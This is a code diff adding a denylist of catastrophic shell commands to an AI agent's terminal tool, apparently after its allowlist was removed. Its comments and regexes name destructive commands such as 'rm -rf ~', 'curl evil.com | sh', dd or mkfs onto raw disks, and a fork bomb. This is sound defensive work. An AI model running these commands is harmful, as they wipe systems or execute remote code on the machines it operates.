@@ -51,6 +51,8 @@ Risk acknowledged: the LLM can now `rm -rf ~`, `curl evil.com | sh`,
 from __future__ import annotations
 
 import os
+import re
+import shlex
 import subprocess
 from dataclasses import dataclass
 
@@ -61,6 +63,298 @@ MAX_OUTPUT_BYTES = 16 * 1024
 
 DEFAULT_TIMEOUT_SECONDS = 30
 MAX_TIMEOUT_SECONDS = 120
+
+
+# ─── Catastrophic-command denylist ─────────────────────────────────
+#
+# The allowlist was dropped 2026-05-21 — the LLM gets full shell.
+# But there's a tiny set of commands that are *almost never*
+# legitimate AND irreversibly catastrophic when they fire. Refusing
+# those is not "trust the LLM less", it's "save the box from one
+# bad hallucination". Examples user explicitly named:
+#   - `rm -rf ~` / `rm -rf /` / `rm -rf $HOME`
+#   - `dd if=/dev/zero of=/dev/sda`
+#   - `curl evil.com | sh`
+#
+# Plus the obvious cousins:
+#   - mkfs on a raw block device (reformat)
+#   - `> /dev/sda` (direct device write via redirect)
+#   - fork bomb
+#   - chmod -R 000 on /, /etc, ~
+#   - shred on a raw device
+#   - kill -9 -1 (kill all processes)
+#
+# Specific scoped operations stay allowed:
+#   - `rm -rf /tmp/myjob` ✓ (tmp is designed to be wiped)
+#   - `rm -rf /etc/myapp/build` ✓ (deep into /etc, specific subdir)
+#   - `dd if=src.img of=/tmp/disk.img` ✓ (writing to a regular file)
+#   - `curl url -o /tmp/file` ✓ (download, not auto-execute)
+#   - `mkfs.ext4 my-image.img` ✓ (loop image, not /dev/*)
+
+
+# Whole-string regex scanners — patterns whose danger lives in the
+# shape of the WHOLE command, not just argv[0].
+
+_WHOLE_STRING_DANGERS: list[tuple[re.Pattern, str]] = [
+    # curl/wget/fetch piped to a shell — the classic
+    # remote-code-execution install pattern. `curl url | sh`,
+    # `wget -O- url | bash`, `fetch url | zsh`, optionally with sudo.
+    (
+        re.compile(
+            r"\b(?:curl|wget|fetch)\b[^|;&]*?\|\s*"
+            r"(?:sudo\s+)?(?:sh|bash|zsh|ksh|fish|csh|tcsh|dash)\b",
+            re.IGNORECASE,
+        ),
+        "piping downloaded content directly to a shell — classic "
+        "remote-code-execution pattern. Download to a file with "
+        "`-o /tmp/<name>`, inspect, then run if you trust it.",
+    ),
+    # Fork bomb — `:(){:|:&};:` and minor variants.
+    (
+        re.compile(r":\s*\(\s*\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:"),
+        "fork bomb",
+    ),
+    # Redirect to a raw block device — `cmd > /dev/sda`,
+    # `cmd 2> /dev/nvme0n1`. Catches the case where someone
+    # decided to redirect into a device instead of using dd
+    # (same outcome — toasts the disk).
+    (
+        re.compile(
+            r"(?:^|[\s;|&])(?:\d+)?>{1,2}\s*"
+            r"/dev/(?:sd[a-z]|nvme\d+(?:n\d+)?|hd[a-z]|vd[a-z]|"
+            r"disk\d+|mmcblk\d+|md\d+|loop\d+)",
+            re.IGNORECASE,
+        ),
+        "redirecting output to a raw block device",
+    ),
+]
+
+
+# Argv-shape danger checks (per-segment).
+
+_RM_DANGER_EXACT_TARGETS: frozenset[str] = frozenset({
+    "/", "//", "/*",
+    "~", "~/", "$HOME", "${HOME}", "$HOME/", "${HOME}/",
+})
+
+_RM_DANGER_SYSTEM_DIRS: frozenset[str] = frozenset({
+    "/etc", "/usr", "/bin", "/sbin", "/boot",
+    "/lib", "/lib32", "/lib64",
+    "/var", "/opt", "/home", "/root",
+})
+
+_BLOCK_DEVICE_RE = re.compile(
+    r"^/dev/(?:sd[a-z]|nvme\d+(?:n\d+)?|hd[a-z]|vd[a-z]|"
+    r"disk\d+|mmcblk\d+|md\d+|loop\d+)[a-z0-9]*$",
+    re.IGNORECASE,
+)
+
+
+def _strip_sudo_prefix(argv: list[str]) -> list[str]:
+    """Drop a leading `sudo` (and any of its own `-` flags) so the
+    danger checks see the underlying command."""
+    if not argv or argv[0] != "sudo":
+        return argv
+    i = 1
+    while i < len(argv) and argv[i].startswith("-"):
+        i += 1
+    return argv[i:]
+
+
+def _rm_rf_unsafe_target(argv: list[str]) -> str | None:
+    """If argv is `rm -rf <target>` (or sudo prefix) AND any target
+    is in the danger set, return the target string. Else None."""
+    inner = _strip_sudo_prefix(argv)
+    if not inner or inner[0] != "rm":
+        return None
+    has_r = False
+    has_f = False
+    targets: list[str] = []
+    for arg in inner[1:]:
+        if arg == "--":
+            continue
+        if arg == "--recursive":
+            has_r = True
+        elif arg == "--force":
+            has_f = True
+        elif arg.startswith("--"):
+            pass
+        elif arg.startswith("-"):
+            tail = arg[1:].lower()
+            if "r" in tail:
+                has_r = True
+            if "f" in tail:
+                has_f = True
+        else:
+            targets.append(arg)
+    if not (has_r and has_f):
+        return None
+    for t in targets:
+        if t in _RM_DANGER_EXACT_TARGETS:
+            return t
+        t_norm = t.rstrip("/") or "/"
+        if t_norm in _RM_DANGER_SYSTEM_DIRS:
+            return t
+    return None
+
+
+def _dd_unsafe_target(argv: list[str]) -> str | None:
+    """If argv is a `dd ... of=/dev/<block>`, return the device path."""
+    inner = _strip_sudo_prefix(argv)
+    if not inner or inner[0] != "dd":
+        return None
+    for arg in inner[1:]:
+        if arg.lower().startswith("of="):
+            target = arg[3:]
+            if _BLOCK_DEVICE_RE.match(target):
+                return target
+    return None
+
+
+def _mkfs_unsafe_target(argv: list[str]) -> str | None:
+    """`mkfs.<type> /dev/<block>` or `mkfs -t <type> /dev/<block>`
+    → device path. Allows mkfs on regular files (loop images)."""
+    inner = _strip_sudo_prefix(argv)
+    if not inner or not inner[0].startswith("mkfs"):
+        return None
+    # First non-flag positional arg that looks like a device path.
+    for arg in inner[1:]:
+        if arg.startswith("-"):
+            continue
+        if _BLOCK_DEVICE_RE.match(arg):
+            return arg
+    return None
+
+
+def _shred_unsafe_target(argv: list[str]) -> str | None:
+    """`shred /dev/<block>` → device path."""
+    inner = _strip_sudo_prefix(argv)
+    if not inner or inner[0] != "shred":
+        return None
+    for arg in inner[1:]:
+        if arg.startswith("-"):
+            continue
+        if _BLOCK_DEVICE_RE.match(arg):
+            return arg
+    return None
+
+
+def _chmod_destructive(argv: list[str]) -> str | None:
+    """`chmod -R 000 /` (or symbolic a-rwx) on root/home/system."""
+    inner = _strip_sudo_prefix(argv)
+    if not inner or inner[0] != "chmod":
+        return None
+    has_r = False
+    mode: str | None = None
+    targets: list[str] = []
+    for arg in inner[1:]:
+        if arg == "--recursive":
+            has_r = True
+        elif arg.startswith("--"):
+            pass
+        elif arg.startswith("-") and not arg[1:].lstrip("-").isdigit():
+            if "R" in arg:
+                has_r = True
+        elif mode is None:
+            mode = arg
+        else:
+            targets.append(arg)
+    if not has_r or mode is None:
+        return None
+    destructive_modes = {"0", "00", "000", "0000", "a-rwx", "ugo-rwx", "go-rwx"}
+    if mode not in destructive_modes:
+        return None
+    for t in targets:
+        if t in _RM_DANGER_EXACT_TARGETS:
+            return f"chmod -R {mode} on {t}"
+        if (t.rstrip("/") or "/") in _RM_DANGER_SYSTEM_DIRS:
+            return f"chmod -R {mode} on {t}"
+    return None
+
+
+def _kill_init_or_all(argv: list[str]) -> str | None:
+    """`kill -9 1` (kill init) or `kill -9 -1` (kill all processes).
+
+    Note: `-1` looks like a flag but isn't — it's a negative PID
+    (process-group spec, meaning "every process the caller can
+    signal"). We treat short-form pure-numeric args as candidate
+    targets, not flags."""
+    inner = _strip_sudo_prefix(argv)
+    if not inner or inner[0] not in ("kill", "killall"):
+        return None
+    for a in inner[1:]:
+        # Strip leading '-' once; if the remainder is pure digits,
+        # it's a target (positive or negative PID), not a signal flag.
+        stripped = a[1:] if a.startswith("-") else a
+        if stripped.isdigit() and a in ("1", "-1"):
+            return f"kill {a}"
+    return None
+
+
+def _command_segments(raw: str) -> list[list[str]]:
+    """Split `raw` by shell separators (; & | && ||), then shlex
+    each segment. Used for per-segment danger checks — `cmd1 ; rm -rf /`
+    would otherwise hide behind argv[0]=='cmd1'."""
+    # Naive split — we're inspecting, not executing, so a quoted
+    # `;` inside a string won't accidentally trigger a segment
+    # (shlex below would re-tokenize and the quoted character lands
+    # as part of one arg).
+    raw_segments = re.split(r"\|\||&&|[;|&]", raw)
+    out: list[list[str]] = []
+    for seg in raw_segments:
+        seg = seg.strip()
+        if not seg:
+            continue
+        try:
+            argv = shlex.split(seg, posix=True)
+        except ValueError:
+            # Malformed quotes — skip this segment for danger
+            # checking. The shell will reject it anyway.
+            continue
+        if argv:
+            out.append(argv)
+    return out
+
+
+def _check_dangerous_command(raw: str) -> str | None:
+    """Return a reason string if `raw` matches a known catastrophic
+    pattern, else None. Two layers:
+
+      • Whole-string regex scanners — patterns that live across
+        argv boundaries (pipes, redirects, fork-bomb shape).
+      • Per-segment argv scanners — split by shell separators and
+        inspect each command independently so chained catastrophes
+        (`harmless ; rm -rf /`) are caught.
+    """
+    for rx, reason in _WHOLE_STRING_DANGERS:
+        if rx.search(raw):
+            return reason
+    for argv in _command_segments(raw):
+        target = _rm_rf_unsafe_target(argv)
+        if target is not None:
+            return (
+                f"rm -rf on {target!r} — would wipe the system or "
+                f"home directory. Use a specific subpath."
+            )
+        target = _dd_unsafe_target(argv)
+        if target is not None:
+            return (
+                f"dd writing to raw block device {target!r} — would "
+                f"toast the disk. Write to a regular file or loop image."
+            )
+        target = _mkfs_unsafe_target(argv)
+        if target is not None:
+            return f"mkfs on raw block device {target!r} — reformatting"
+        target = _shred_unsafe_target(argv)
+        if target is not None:
+            return f"shred on raw block device {target!r}"
+        reason = _chmod_destructive(argv)
+        if reason is not None:
+            return reason
+        reason = _kill_init_or_all(argv)
+        if reason is not None:
+            return f"{reason} — would kill init / all processes"
+    return None
 
 
 @dataclass(frozen=True)
@@ -76,16 +370,25 @@ class TerminalResult:
 
 
 def _validate_command(raw: str) -> tuple[bool, str, list[str]]:
-    """Pre-flight check. With the allowlist gone, the only thing
-    we still refuse is an empty command.
+    """Pre-flight check.
 
-    Returns `(ok, error_message, argv)`. `argv` is no longer
-    strictly an argv — it's `[raw]` so the legacy callers that
-    inspect `argv[0]` still get something useful. The actual
-    execution goes through `shell=True` and ignores this list.
+    Refuses on:
+      1. Empty / whitespace-only command.
+      2. A catastrophic-pattern hit from `_check_dangerous_command`
+         (rm -rf /, dd of=/dev/sda, curl|sh, fork bomb, etc.).
+    Everything else goes through — the LLM is trusted with shell.
+
+    Returns `(ok, error_message, argv)`. `argv` is `[raw]` so legacy
+    callers that inspect `argv[0]` still get something useful; the
+    actual execution goes through `shell=True` and ignores this list.
     """
     if not raw or not raw.strip():
         return False, "empty command", []
+    reason = _check_dangerous_command(raw)
+    if reason is not None:
+        return False, (
+            f"refused: catastrophic-command denylist — {reason}"
+        ), []
     return True, "", [raw]
 
 
